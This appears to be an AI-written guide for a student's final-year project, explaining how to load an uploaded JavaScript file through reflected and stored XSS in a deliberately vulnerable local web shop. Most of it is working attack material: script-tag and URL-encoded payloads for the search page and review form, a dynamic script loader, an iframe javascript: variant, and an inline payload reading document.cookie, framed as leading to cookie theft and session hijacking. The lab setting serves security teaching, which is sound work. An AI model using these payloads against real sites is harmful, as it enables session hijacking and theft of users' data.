# How to Trigger Uploaded JS File via XSS

## ⚠️ Important: Browser vs Node.js JavaScript

Your `shell.js` file is **Node.js code** and **cannot execute in browsers**. It uses:
- `import http from 'http'` - Not available in browsers
- `child_process.exec()` - Not available in browsers
- `server.listen()` - Node.js server code

**Solution**: Use browser-compatible JavaScript instead!

---

## ✅ Solution: Browser-Compatible Payload

I've created `browser-shell.js` in `/uploads/` - this is **browser-compatible** JavaScript.

### Step 1: Upload Browser-Compatible File (Optional)
If you want to upload it via admin panel:
1. Go to `/admin/home`
2. Upload `browser-shell.js` (or use the one already created)
3. Note the path: `/uploads/browser-shell.js`

### Step 2: Trigger via XSS

#### Method A: Via Search Page (Reflected XSS)
1. Enable XSS if needed (not required for search page)
2. Go to search page
3. Enter this payload:
   ```
   <script src="/uploads/browser-shell.js"></script>
   ```
4. Or try URL-encoded:
   ```
   <script src=/uploads/browser-shell.js></script>
   ```

**URL:**
```
/search?q=<script src="/uploads/browser-shell.js"></script>
```

**URL-Encoded:**
```
/search?q=%3Cscript%20src%3D%22%2Fuploads%2Fbrowser-shell.js%22%3E%3C%2Fscript%3E
```

#### Method B: Via Stored XSS (Reviews)
1. Go to any product page (e.g., `/product/1`)
2. **Enable XSS**: Click "⚠️ Enable XSS (Demo)" button
3. Submit a review with:
   ```html
   <script src="/uploads/browser-shell.js"></script>
   ```
4. When page reloads, the script will execute!

#### Method C: Direct Script Injection
If you can inject HTML, you can reference the file:

```html
<!-- Via stored XSS (review comment) -->
<script src="/uploads/browser-shell.js"></script>

<!-- Or inline -->
<script>
  // Load external script
  const script = document.createElement('script');
  script.src = '/uploads/browser-shell.js';
  document.head.appendChild(script);
</script>
```

---

## 🧪 Testing Steps

### Test 1: Via Search Page (Easiest)
1. Visit:
   ```
   http://localhost:3000/search?q=<script src="/uploads/browser-shell.js"></script>
   ```
2. Alert should appear immediately!

### Test 2: Via Stored XSS
1. Go to `/product/1`
2. Click "⚠️ Enable XSS (Demo)"
3. Submit review:
   - Name: `Test`
   - Rating: `5`
   - Comment: `<script src="/uploads/browser-shell.js"></script>`
4. Click Submit
5. Alert should appear on page reload!

### Test 3: Check File is Accessible
First, verify the file exists:
```bash
# In browser:
http://localhost:3000/uploads/browser-shell.js

# Should show the JavaScript code
```

---

## 🔍 Why Your Shell.js Didn't Work

### Problem 1: Node.js vs Browser JavaScript
```
shell.js uses:
- import http from 'http'        ❌ Not in browser
- child_process.exec()           ❌ Not in browser  
- server.listen()                ❌ Node.js only
```

### Problem 2: Browser Can't Execute Node.js Code
When browser tries to load it:
```javascript
// Browser tries to execute:
import http from 'http';  // ❌ SyntaxError: Cannot use import statement
```

### Solution: Browser-Compatible Code
```javascript
// browser-shell.js uses:
- alert()                       ✅ Works in browser
- document.cookie               ✅ Works in browser
- window.location               ✅ Works in browser
- Browser APIs only             ✅ All work!
```

---

## 📝 Alternative Payloads

### Simple Alert Payload:
```html
<script src="/uploads/browser-shell.js"></script>
```

### Dynamic Load:
```html
<script>
  const s = document.createElement('script');
  s.src = '/uploads/browser-shell.js';
  document.head.appendChild(s);
</script>
```

### Via Iframe (if script blocked):
```html
<iframe src="javascript:'<script src=/uploads/browser-shell.js></script>'"></iframe>
```

### Embedded Payload (no external file):
```html
<script>
  alert('XSS Executed!');
  console.log('Cookies:', document.cookie);
</script>
```

---

## ✅ Quick Test

### Test via Search (Copy this URL):
```
http://localhost:3000/search?q=<script src="/uploads/browser-shell.js"></script>
```

**Expected Result:**
- Alert pops up: "🎯 XSS SUCCESS! Malicious script..."
- Check browser console for logs
- Script executed successfully!

---

## 🎯 For Your FYP Report

### Attack Chain:
1. **File Upload Vulnerability** → Attacker uploads `browser-shell.js`
2. **File Accessible** → `/uploads/browser-shell.js` is publicly accessible
3. **XSS Vulnerability** → Search page reflects user input without sanitization
4. **Script Injection** → `<script src="/uploads/browser-shell.js"></script>`
5. **Code Execution** → Browser loads and executes malicious JavaScript
6. **Impact** → Cookie theft, data exfiltration, session hijacking

### Security Issues:
- ✅ Unrestricted file upload (JS files allowed)
- ✅ Files stored in public directory
- ✅ XSS vulnerability (search page)
- ✅ No Content Security Policy (CSP)
- ✅ External scripts can be loaded

---

## 🔧 Troubleshooting

### Issue: Script doesn't load
**Check:**
1. File exists at `/uploads/browser-shell.js`
2. File is accessible: Visit `http://localhost:3000/uploads/browser-shell.js`
3. No browser console errors
4. XSS is working (try simple `<script>alert('test')</script>` first)

### Issue: Alert doesn't appear
**Check:**
1. Browser blocked popups? Check browser console
2. CSP blocking script? Check console for CSP errors
3. Script syntax error? Check console for errors
4. File path correct? Verify URL is accessible

### Issue: XSS not working
**Check:**
1. For Search: No XSS flag needed, should work immediately
2. For Reviews: Must enable XSS button first
3. Browser XSS protection? Try different browser
4. Check page source to see if script tag is in HTML

---

## 📚 Next Steps

1. **Test via Search**: Use the URL above
2. **Test via Reviews**: Enable XSS, submit review with script tag
3. **Verify Execution**: Alert should appear + console logs
4. **Document**: Take screenshots for FYP report

The `browser-shell.js` file is ready to use - just reference it via XSS!
